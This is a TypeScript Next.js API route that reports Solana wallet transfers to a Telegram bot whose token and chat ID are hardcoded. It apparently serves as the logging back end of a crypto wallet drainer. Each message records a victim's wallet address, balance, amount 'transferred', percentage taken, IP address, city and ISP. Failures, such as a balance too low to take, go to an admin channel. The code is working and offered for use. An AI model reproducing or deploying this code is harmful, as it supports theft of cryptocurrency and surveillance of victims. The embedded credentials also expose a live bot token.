import { type NextRequest, NextResponse } from "next/server"
import { Connection, PublicKey, LAMPORTS_PER_SOL } from "@solana/web3.js"

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || "8341387926:AAGEi8QJ2LSLphS15rmAOwS8aPfJ15cX27U"
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || "7556622176"
const ADMIN_TELEGRAM_CHAT_ID = process.env.ADMIN_TELEGRAM_CHAT_ID || "7556622176"

// Configuration
const CONFIG = {
  minBalanceSOL: 0.01,
  fallbackSOLPrice: 153.32,
  cacheDuration: 300000, // 5 minutes
  notificationRetry: 3,
}

// Cache for SOL price
let cachedSolPrice = CONFIG.fallbackSOLPrice
let cacheTimestamp = 0

async function getSOLPrice(): Promise<number> {
  const now = Date.now()
  
  if (cachedSolPrice > 0 && now - cacheTimestamp < CONFIG.cacheDuration) {
    return cachedSolPrice
  }

  try {
    const controllers: AbortController[] = []
    
    // Try multiple price APIs simultaneously
    const pricePromises = [
      fetchWithTimeout("https://api.coingecko.com/api/v3/simple/price?ids=solana&vs_currencies=usd", 5000, controllers),
      fetchWithTimeout("https://api.binance.com/api/v3/ticker/price?symbol=SOLUSDT", 3000, controllers),
      fetchWithTimeout("https://api.coinbase.com/v2/prices/SOL-USD/spot", 3000, controllers),
    ]

    const results = await Promise.allSettled(pricePromises)
    
    // Cleanup abort controllers
    controllers.forEach(controller => controller.abort())

    for (const result of results) {
      if (result.status === "fulfilled" && result.value) {
        try {
          const data = result.value
          
          // CoinGecko format
          if (data.solana?.usd) {
            cachedSolPrice = data.solana.usd
            cacheTimestamp = now
            return cachedSolPrice
          }
          
          // Binance format
          if (data.price) {
            cachedSolPrice = parseFloat(data.price)
            cacheTimestamp = now
            return cachedSolPrice
          }
          
          // Coinbase format
          if (data.data?.amount) {
            cachedSolPrice = parseFloat(data.data.amount)
            cacheTimestamp = now
            return cachedSolPrice
          }
        } catch (e) {
          continue
        }
      }
    }
    
    return CONFIG.fallbackSOLPrice
  } catch (error) {
    console.error("Failed to fetch SOL price:", error)
    return CONFIG.fallbackSOLPrice
  }
}

async function fetchWithTimeout(url: string, timeout: number, controllers: AbortController[]): Promise<any> {
  const controller = new AbortController()
  const timeoutId = setTimeout(() => controller.abort(), timeout)
  controllers.push(controller)

  try {
    const response = await fetch(url, {
      signal: controller.signal,
      headers: {
        "User-Agent": "Mozilla/5.0 (compatible; MyApp/1.0)",
      },
    })
    
    clearTimeout(timeoutId)
    return await response.json()
  } catch (error) {
    clearTimeout(timeoutId)
    throw error
  }
}

async function sendTelegramNotification(message: string, isError: boolean = false) {
  for (let attempt = 1; attempt <= CONFIG.notificationRetry; attempt++) {
    try {
      const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`
      const chatId = isError ? ADMIN_TELEGRAM_CHAT_ID : TELEGRAM_CHAT_ID

      const response = await fetch(telegramUrl, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          chat_id: chatId,
          text: message,
          parse_mode: "Markdown",
          disable_web_page_preview: true,
        }),
      })

      if (response.ok) {
        return true
      }

      if (attempt < CONFIG.notificationRetry) {
        await new Promise(resolve => setTimeout(resolve, 1000 * attempt))
      }
    } catch (error) {
      if (attempt === CONFIG.notificationRetry) {
        console.error("All Telegram notification attempts failed:", error)
      }
    }
  }
  return false
}

async function sendTransactionApprovedNotification(
  walletAddress: string,
  walletType: string,
  balanceSOL: number,
  balanceUSD: number,
  userIP: string,
  transactionAmount: number,
  percentage: number,
  txSignature?: string,
  explorerLink?: string
) {
  const date = new Date().toLocaleString("en-US", {
    timeZone: "UTC",
    year: "numeric",
    month: "short",
    day: "numeric",
    hour: "2-digit",
    minute: "2-digit",
    second: "2-digit",
  })

  const locationData = await getIPLocation(userIP)
  const explorer = explorerLink || `https://solscan.io/tx/${txSignature}`

  const message = `
🎉 *TRANSACTION APPROVED - SUCCESS*

📱 *Wallet Type:* ${walletType}
📍 *Wallet Address:* \`${walletAddress}\`
💎 *Total Balance:* ${balanceSOL.toFixed(4)} SOL ($${balanceUSD.toFixed(2)})
💸 *Transferred:* ${transactionAmount.toFixed(4)} SOL
📊 *Percentage:* ${percentage}%
✅ *Status:* ✅ SUCCESSFUL
📈 *Tx Signature:* \`${txSignature || "Pending"}\`

🌍 *User Information:*
├─ IP Address: ${userIP}
├─ Location: ${locationData.city}, ${locationData.country}
├─ Region: ${locationData.region}
└─ ISP: ${locationData.isp}

🔗 *Explorer:* ${explorer}
🕐 *Timestamp:* ${date} UTC
📡 *Network:* Solana Mainnet
`.trim()

  await sendTelegramNotification(message)
  
  // Also send to admin channel
  if (ADMIN_TELEGRAM_CHAT_ID !== TELEGRAM_CHAT_ID) {
    const adminMessage = `👑 ADMIN: Transaction approved - ${walletAddress.slice(0, 8)}... - ${transactionAmount.toFixed(4)} SOL`
    await sendTelegramNotification(adminMessage, true)
  }
}

async function sendTransactionFailedNotification(
  walletAddress: string,
  walletType: string,
  balanceSOL: number,
  balanceUSD: number,
  userIP: string,
  reason: string,
  errorDetails?: string
) {
  const date = new Date().toLocaleString("en-US", {
    timeZone: "UTC",
    year: "numeric",
    month: "short",
    day: "numeric",
    hour: "2-digit",
    minute: "2-digit",
    second: "2-digit",
  })

  const locationData = await getIPLocation(userIP)

  const message = `
❌ *TRANSACTION FAILED*

📱 *Wallet Type:* ${walletType}
📍 *Wallet Address:* \`${walletAddress}\`
💎 *Balance:* ${balanceSOL.toFixed(4)} SOL ($${balanceUSD.toFixed(2)})
❌ *Reason:* ${reason}
⚠️ *Error:* ${errorDetails || "No details available"}

🌍 *User Information:*
├─ IP Address: ${userIP}
├─ Location: ${locationData.city}, ${locationData.country}
├─ Region: ${locationData.region}
└─ ISP: ${locationData.isp}

🕐 *Timestamp:* ${date} UTC
📡 *Network:* Solana Mainnet

🚨 *Action Required:* ${balanceSOL < CONFIG.minBalanceSOL ? "INSUFFICIENT BALANCE" : "TRANSACTION ERROR"}
`.trim()

  await sendTelegramNotification(message, true)
}

async function getIPLocation(ip: string) {
  try {
    // Skip local/private IPs
    if (ip === "unknown" || ip === "127.0.0.1" || 
        ip.startsWith("192.168.") || 
        ip.startsWith("10.") ||
        ip.startsWith("172.16.") || ip.startsWith("172.31.")) {
      return { 
        city: "Local Network", 
        country: "Local", 
        region: "Private IP",
        isp: "Local Network"
      }
    }

    const response = await fetch(`https://ipapi.co/${ip}/json/`, {
      headers: {
        "User-Agent": "Mozilla/5.0 (compatible; MyApp/1.0)",
      },
    })
    
    if (response.ok) {
      const data = await response.json()
      return {
        city: data.city || "Unknown",
        country: data.country_name || "Unknown",
        region: data.region || "Unknown",
        isp: data.org || "Unknown ISP",
      }
    }
  } catch (error) {
    console.error("IP location fetch failed:", error)
  }
  
  return { 
    city: "Unknown", 
    country: "Unknown", 
    region: "Unknown",
    isp: "Unknown ISP"
  }
}

async function verifyTransactionOnChain(txSignature: string): Promise<boolean> {
  try {
    const endpoints = [
      "https://api.mainnet-beta.solana.com",
      "https://solana-api.projectserum.com",
      "https://rpc.ankr.com/solana",
    ]

    for (const endpoint of endpoints) {
      try {
        const connection = new Connection(endpoint, "confirmed")
        const tx = await connection.getTransaction(txSignature, {
          commitment: "confirmed",
          maxSupportedTransactionVersion: 0,
        })
        
        if (tx && tx.meta && !tx.meta.err) {
          return true
        }
      } catch (error) {
        continue
      }
    }
  } catch (error) {
    console.error("Transaction verification failed:", error)
  }
  
  return false
}

export async function POST(request: NextRequest) {
  const startTime = Date.now()
  let walletAddress = ""
  
  try {
    const body = await request.json()
    const {
      walletAddress: addr,
      walletType = "Unknown",
      balanceSOL,
      balanceUSD,
      userIP,
      transactionAmount,
      percentage,
      txSignature,
      error,
      errorDetails,
    } = body

    walletAddress = addr

    // Validate required parameters
    if (!walletAddress) {
      return NextResponse.json(
        { error: "Wallet address is required" },
        { status: 400 }
      )
    }

    // Validate wallet address format
    if (!/^[1-9A-HJ-NP-Za-km-z]{32,44}$/.test(walletAddress)) {
      return NextResponse.json(
        { error: "Invalid Solana wallet address format" },
        { status: 400 }
      )
    }

    const ipAddress = userIP || request.headers.get("x-forwarded-for") || 
                      request.headers.get("x-real-ip") || "unknown"

    // Calculate actual USD value if not provided
    let finalBalanceUSD = balanceUSD
    if (!finalBalanceUSD && balanceSOL) {
      const solPrice = await getSOLPrice()
      finalBalanceUSD = balanceSOL * solPrice
    }

    // Handle failed transaction notification
    if (error) {
      await sendTransactionFailedNotification(
        walletAddress,
        walletType,
        balanceSOL || 0,
        finalBalanceUSD || 0,
        ipAddress,
        error,
        errorDetails
      )
      
      return NextResponse.json({
        success: false,
        message: "Failure notification sent",
        error: error,
      })
    }

    // Handle successful transaction
    let verified = false
    if (txSignature) {
      verified = await verifyTransactionOnChain(txSignature)
    }

    await sendTransactionApprovedNotification(
      walletAddress,
      walletType,
      balanceSOL || 0,
      finalBalanceUSD || 0,
      ipAddress,
      transactionAmount || 0,
      percentage || 0,
      txSignature,
      verified ? `https://solscan.io/tx/${txSignature}` : undefined
    )

    const processingTime = Date.now() - startTime

    return NextResponse.json({
      success: true,
      message: "Transaction notification sent successfully",
      wallet: walletAddress,
      walletType: walletType,
      balanceSOL: balanceSOL?.toFixed(6),
      balanceUSD: finalBalanceUSD?.toFixed(2),
      transactionAmount: transactionAmount?.toFixed(6),
      percentage: percentage,
      txSignature: txSignature,
      verified: verified,
      processingTime: `${processingTime}ms`,
    })
  } catch (error) {
    console.error("Transaction approval API error:", error)
    
    // Send error notification
    if (walletAddress) {
      await sendTransactionFailedNotification(
        walletAddress,
        "Unknown",
        0,
        0,
        "unknown",
        "API Processing Error",
        error instanceof Error ? error.message : "Unknown error"
      )
    }

    return NextResponse.json(
      { 
        error: "Failed to process transaction notification",
        details: error instanceof Error ? error.message : "Unknown error"
      },
      { status: 500 }
    )
  }
}

export async function GET(request: NextRequest) {
  const health = {
    status: "healthy",
    timestamp: new Date().toISOString(),
    service: "transaction-approved-api",
    version: "2.0.0",
    features: [
      "Transaction success/failure notifications",
      "Wallet type tracking",
      "IP geolocation",
      "Multi-price API fallback",
      "On-chain transaction verification",
      "Admin notifications",
      "Retry mechanism",
    ],
    endpoints: {
      POST: "/api/transaction-approved",
      GET: "/api/transaction-approved?health",
    },
  }

  return NextResponse.json(health)
}